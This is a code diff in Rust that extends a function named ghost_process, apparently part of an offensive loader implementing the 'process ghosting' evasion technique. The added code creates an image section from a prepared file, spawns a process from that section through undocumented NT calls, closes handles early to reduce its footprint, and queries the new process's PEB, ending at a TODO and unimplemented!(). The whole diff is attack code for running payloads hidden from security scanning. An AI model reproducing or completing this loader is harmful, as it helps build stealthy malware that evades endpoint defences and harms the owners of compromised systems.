@@ -162,8 +162,75 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
         written += actually_written;
     }
 
+    // Create SEC_IMAGE section from the file
+    let status = nt::nt_create_section(
+        &mut state.section_handle,
+        0x000F001F,
+        null_mut(),
+        null_mut(),
+        0x04,
+        0x01000000,
+        state.file_handle,
+    );
 
+    if status != STATUS_SUCCESS || state.section_handle.is_null() {
+        debug!("[GHOST] NtCreateSection failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+    debug!("[GHOST] SEC_IMAGE section created");
 
+    // Close the file handle
+    nt::nt_close(state.file_handle);
+    state.file_handle = null_mut();
+
+    // Create the ghosted process
+    let current_process: HANDLE = -1isize as HANDLE;
+    let status = nt::nt_create_process_ex(
+        &mut state.process_handle,
+        0x0010047B,           // VM_RW|VM_OP|QUERY_INFO|CREATE_THREAD|DUP_HANDLE|TERMINATE|SYNC
+        null_mut(),           // ObjectAttributes
+        current_process,      // ParentProcess
+        0,                    // Flags
+        state.section_handle, // SectionHandle — the ghost section
+        null_mut(),           // DebugPort
+        null_mut(),           // ExceptionPort
+        0,                    // JobMemberLevel
+    );
+
+    if status != STATUS_SUCCESS || state.process_handle.is_null() {
+        debug!("[GHOST] NtCreateProcessEx failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+    debug!("[GHOST] Process created: {:p}", state.process_handle);
+
+    // Section handle is not longer needed, the kernel holds its own reference.
+    // Closing early will shrink our fotprint
+    nt::nt_close(state.section_handle);
+    state.section_handle = null_mut();
+
+    // Query the remote PEB address
+    let mut process_basic_information: ProcessBasicInformation = core::mem::zeroed();
+    let mut return_lenght: u32 = 0;
+
+    let status = nt::nt_query_information_process(
+        state.process_handle, 
+        0, 
+        &mut process_basic_information as *mut _ as *mut c_void, 
+        core::mem::size_of::<ProcessBasicInformation>() as u32, 
+        &mut return_lenght,
+    );
+
+    if status != STATUS_SUCCESS || process_basic_information.peb_base_address.is_null() {
+        debug!("[GHOST] NtQueryInformationPRocess failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+    state.process_id = process_basic_information.unique_process_id;
+    debug!("[GHOST] Ghost PID: {}", state.process_id);
+
+    // TODO: Read remote PEB to get the image base then cmpute entry point
     unimplemented!()
 }
 
